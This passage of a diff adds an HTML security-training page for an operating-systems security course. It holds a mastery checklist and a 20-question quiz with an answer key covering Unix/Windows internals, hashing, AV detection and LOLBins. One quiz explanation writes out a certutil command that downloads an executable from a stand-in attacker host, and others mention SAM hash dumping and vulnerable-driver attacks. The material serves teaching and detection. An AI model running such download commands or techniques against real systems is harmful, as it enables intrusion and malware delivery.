+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Perform I/O redirection including stderr merge (2>&amp;1) and /dev/null discard</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Write bash scripts with variables, quoting, conditionals, loops, and functions</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Explain all 8 types of bash shell expansion in order of evaluation</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Use kill signals: SIGHUP(1), SIGINT(2), SIGKILL(9), SIGTERM(15)</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Navigate Unix FHS and know the security significance of each major directory</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Calculate and apply chmod permissions in both numeric and symbolic form</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Explain SUID, SGID, sticky bit and their security implications</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Distinguish hard links from symbolic links (inode, cross-filesystem, dangling)</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Navigate Windows filesystem with both cmd.exe and PowerShell</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Explain NTFS Alternate Data Streams and their forensic/security significance</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Know all 5 Windows registry hives, their abbreviations, and backing files on disk</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Know all registry value types: REG_SZ, REG_DWORD, REG_BINARY, REG_EXPAND_SZ, REG_MULTI_SZ</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Identify security-critical registry keys (Run, Services, SAM, Winlogon)</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Explain hashing properties: one-way, collision resistance, avalanche effect</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Compare MD5/SHA-1 (broken) vs SHA-256/SHA-3 (current); know output sizes</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Explain salt and why it defeats rainbow table attacks</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Compare all 5 AV detection methods with strengths and weaknesses</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Explain signature evasion: packing, polymorphism, metamorphism, LotL</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Explain Tripwire and AIDE: how they create baselines and detect changes</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Explain WRP/WFP and use sfc /scannow to verify system files</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Explain full code signing process from hash → signature → verification</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Explain CRL vs OCSP and OCSP Stapling</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Explain CPU privilege rings and why kernel-mode drivers are high-risk</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Manage systemd services (start/stop/enable/mask/daemon-reload) and read unit files</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Know Windows/Unix executable formats: PE, ELF, .sys, .ko and how to identify by magic bytes</span></li>
+    <li onclick="toggleCheck(this)"><span class="check-box">✓</span><span>Know LOLBins: certutil, mshta, regsvr32, wmic, rundll32 and their abuse methods</span></li>
+  </ul>
+</div>
+
+  </main>
+</div>
+
+<script>
+function show(id) {
+  document.querySelectorAll('.section').forEach(s=>s.classList.remove('active'));
+  document.querySelectorAll('nav a').forEach(a=>a.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  document.getElementById('nav-'+id).classList.add('active');
+}
+
+function toggleCheck(li) {
+  li.classList.toggle('checked');
+  updateProgress();
+}
+
+function updateProgress() {
+  const items=document.querySelectorAll('#masteryList li');
+  const done=document.querySelectorAll('#masteryList li.checked').length;
+  const pct=Math.round((done/items.length)*100);
+  document.getElementById('progressFill').style.width=pct+'%';
+  document.getElementById('progressLabel').textContent=done+' / '+items.length+' topics mastered';
+}
+
+const questions=[
+  {q:"What does STAT code 'Z' mean in ps aux output?",opts:["Process is sleeping","Process is running","Zombie: finished but parent hasn't called wait()","Process suspended by signal"],answer:2,exp:"Z=zombie. The process has exited but its exit status hasn't been collected by the parent via wait(). Fix by repairing or killing the parent."},
+  {q:"Which netstat state indicates a possible SYN flood attack if seen in large numbers?",opts:["TIME_WAIT","ESTABLISHED","SYN_RECV","CLOSE_WAIT"],answer:2,exp:"SYN_RECV = server received a SYN and sent SYN-ACK but not yet received ACK. Hundreds of these = SYN flood (half-open connection attack)."},
+  {q:"In bash, what is the difference between single quotes and double quotes?",opts:["Single quotes are faster; double quotes enable color","Single quotes are literal (no expansion); double quotes allow $VAR and `cmd` expansion","Double quotes prevent word splitting; single quotes allow it","There is no practical difference"],answer:1,exp:"Single quotes: everything is literal, no $VAR, no command substitution. Double quotes: $VAR, $(cmd), and \\-escapes are expanded but word splitting is prevented."},
+  {q:"Which signal number cannot be caught, blocked, or ignored by a process?",opts:["SIGTERM (15)","SIGHUP (1)","SIGKILL (9)","SIGINT (2)"],answer:2,exp:"SIGKILL (9) is the only signal that cannot be intercepted by the process. SIGTERM (15) is the graceful default that can be caught. Use SIGKILL as a last resort."},
+  {q:"A Linux file has permissions rwsr-xr-x (SUID set, owned by root). What happens when a regular user executes it?",opts:["The user gets permanent root access","The process runs with root privileges for the duration of execution","The file is blocked from running","The user is prompted for root password"],answer:1,exp:"SUID: process runs with the file OWNER's privileges (root), not the executing user's. Exits when process ends. Example: /usr/bin/passwd uses SUID to write to /etc/shadow."},
+  {q:"What is the key difference between a hard link and a symbolic link?",opts:["Hard links can span filesystems; symlinks cannot","Hard links point to the same inode; deleting the original leaves the hard link intact. Symlinks break if target is deleted.","Symlinks take more disk space","Hard links cannot link to files, only directories"],answer:1,exp:"Hard link = another name pointing to same inode (data). Both must be deleted for data to be gone. Symlinks contain a path string — they break (dangle) if the target is deleted."},
+  {q:"What does NTFS Alternate Data Streams (ADS) allow, and which Windows flag shows them?",opts:["Multiple partitions on one disk; shown with /v","Multiple data streams per file; shown with dir /r","Encrypted file streams; shown with cipher /e","Compressed files; shown with compact /s"],answer:1,exp:"ADS: multiple named data streams per NTFS file (file.txt:streamname). Normal dir won't show them. 'dir /r' reveals ADS. Zone.Identifier is a common ADS marking downloaded files."},
+  {q:"Which Windows Registry hive contains the NTLM password hashes for local accounts?",opts:["HKCU\\Security","HKLM\\SOFTWARE\\Microsoft\\Windows NT","HKLM\\SAM\\SAM\\Domains\\Account\\Users","HKCU\\System\\Credentials"],answer:2,exp:"HKLM\\SAM contains local account hashes. Protected by ACL requiring SYSTEM access. Attackers dump it via VSS shadow copies, reg save, or LSASS memory."},
+  {q:"SHA-256 produces a 256-bit hash. How many hexadecimal characters is that?",opts:["32","48","64","128"],answer:2,exp:"256 bits ÷ 4 bits per hex char = 64 hex characters. MD5 = 32 hex (128 bits). SHA-1 = 40 hex (160 bits). SHA-512 = 128 hex (512 bits)."},
+  {q:"What is the purpose of a cryptographic salt in password hashing?",opts:["To encrypt the hash for storage","To make the hash algorithm faster","A random per-user value appended before hashing to defeat rainbow table attacks","To add a secret key to the hash function (that's an HMAC)"],answer:2,exp:"Salt: random per-user value stored alongside the hash. Makes rainbow table attacks useless — each user would need their own precomputed table. Identical passwords produce different hashes."},
+  {q:"Which AV detection method is most effective against a completely novel zero-day malware sample?",opts:["Signature-based","Behavioral/dynamic sandboxing","Hash-based scanning","CRC checksum matching"],answer:1,exp:"Behavioral/dynamic analysis observes what the code DOES (API calls, file writes, network connections) rather than what it looks like. Novel malware may not match any signature but will exhibit malicious behavior."},
+  {q:"Tripwire detects that /etc/passwd has been modified. What does it compare against to make this determination?",opts:["A live copy of the file on a remote server","A cryptographic baseline database created when the system was known-good","The Windows Registry","A manufacturer's known-good hash database"],answer:1,exp:"Tripwire (and AIDE) create a baseline database at initialization with hashes, permissions, timestamps, etc. Later --check runs compare current state against this baseline and report deviations."},
+  {q:"A developer signs their software in 2022 with a cert that expires in 2023. In 2025, a user downloads the software. Will the signature still be valid?",opts:["No — expired certificates always invalidate signatures","Yes — if a trusted Timestamp Authority countersigned at time of signing, the signature remains valid past cert expiry","Only if the user manually trusts the expired cert","It depends on the OS version"],answer:1,exp:"Timestamping is critical: a TSA countersignature proves the signature existed BEFORE the cert expired. This is why reputable software is always timestamped at signing time."},
+  {q:"What is a BYOVD attack?",opts:["A backdoor using VBA in Office documents","Loading a legitimate but vulnerable signed driver to gain kernel access and bypass security controls","A browser-based video download exploit","Bring Your Own VPN Device — a network attack"],answer:1,exp:"Bring Your Own Vulnerable Driver: attacker drops a legitimately signed but known-vulnerable driver, exploits its vulnerability in Ring 0, and uses kernel access to disable Driver Signature Enforcement or AV protection."},
+  {q:"A systemd service unit file has 'Restart=on-failure'. What does this do?",opts:["Restarts the OS if the service crashes","Automatically restarts the service if it exits with a non-zero exit code","Only restarts if systemd itself fails","Emails an alert on failure"],answer:1,exp:"Restart=on-failure: systemd auto-restarts the service if it exits with non-zero status or is killed by a signal. Restart=always would restart even on clean exit."},
+  {q:"What is the correct description of the Windows service Start type value of '4' in the registry?",opts:["Boot — loaded by bootloader","Automatic — starts at OS boot","Manual — starts on demand","Disabled — cannot be started"],answer:3,exp:"Registry values under Services\\Start: 0=Boot, 1=System, 2=Automatic, 3=Manual/Demand, 4=Disabled. Disabled prevents the service from being started at all."},
+  {q:"Which ELF file type is the Linux equivalent of a Windows DLL?",opts:[".ko (kernel object)",".so (shared object)",".sh (shell script)",".bin (binary)"],answer:1,exp:".so = Shared Object. Equivalent to Windows DLL. Loaded at runtime by the dynamic linker. .ko = kernel module (Ring 0, like Windows .sys driver). LD_PRELOAD can inject a .so into any process."},
+  {q:"A file system runs out of space even though df -h shows plenty of disk space remaining. What is the most likely cause?",opts:["The filesystem is fragmented","The filesystem has run out of inodes","The partition table is corrupted","The filesystem journal is full"],answer:1,exp:"Inode exhaustion: each filesystem has a fixed number of inodes created at format time. Creating millions of small files (e.g., mail queues, temp files) can exhaust inodes while disk space appears available. Check with 'df -i'."},
+  {q:"Which LOLBin can be used to download a remote file, decode base64 content, and is often flagged in SIEM rules?",opts:["cmd.exe","notepad.exe","certutil.exe","explorer.exe"],answer:2,exp:"certutil.exe: legitimate Windows tool for certificate operations. Commonly abused to download files (certutil -urlcache -split -f http://evil.com/p.exe) or decode base64 (certutil -decode). High-fidelity detection indicator."},
+  {q:"What does GPT provide that MBR cannot?",opts:["The ability to format with NTFS","More than 4 primary partitions, disks larger than 2TB, and redundant partition tables","Faster disk access times","Support for disk encryption"],answer:1,exp:"GPT advantages over MBR: supports 128 partitions (vs 4), no 2TB size limit (uses 64-bit LBA), backup partition table at end of disk for redundancy, and a unique GUID per partition. Required for UEFI/Secure Boot."}
+];
+
+function buildQuiz(){
+  const c=document.getElementById('quizContainer');
+  questions.forEach((q,i)=>{
+    const d=document.createElement('div');
+    d.className='quiz-q';d.id='q'+i;
+    let opts=q.opts.map((o,j)=>`<label class="quiz-option" id="opt-${i}-${j}"><input type="radio" name="q${i}" value="${j}"> ${o}</label>`).join('');
+    d.innerHTML=`<div class="question">Q${i+1}. ${q.q}</div>${opts}<button class="quiz-btn" onclick="checkAnswer(${i})">Check Answer</button><div class="feedback" id="fb-${i}"></div>`;
+    c.appendChild(d);
+  });
+}
+
+function checkAnswer(i){
+  const sel=document.querySelector(`input[name="q${i}"]:checked`);
+  const fb=document.getElementById('fb-'+i);
+  if(!sel){fb.style.display='block';fb.className='feedback';fb.textContent='// Select an option first';return;}
+  const val=parseInt(sel.value);
+  const q=questions[i];
+  document.querySelectorAll(`#q${i} .quiz-option`).forEach((opt,j)=>{
+    if(j===q.answer)opt.classList.add('correct');
+    else if(j===val&&val!==q.answer)opt.classList.add('wrong');
+  });
+  fb.style.display='block';
+  if(val===q.answer){fb.className='feedback correct';fb.textContent='// CORRECT — '+q.exp;}
+  else{fb.className='feedback wrong';fb.textContent='// INCORRECT — '+q.exp;}
+}
+
+buildQuiz();
+
+function toggleSidebar() {
+  const nav = document.querySelector('nav');
+  const overlay = document.getElementById('overlay');
+  nav.classList.toggle('open');
+  overlay.classList.toggle('active');
+}
+function closeSidebar() {
+  document.querySelector('nav').classList.remove('open');
+  document.getElementById('overlay').classList.remove('active');
+}
+// Close sidebar when a section link is clicked on mobile
+document.querySelectorAll('nav a').forEach(a => {
+  a.addEventListener('click', () => {
+    if (window.innerWidth <= 768) closeSidebar();
+  });
+});
+
+</script>
+</body>
+</html>
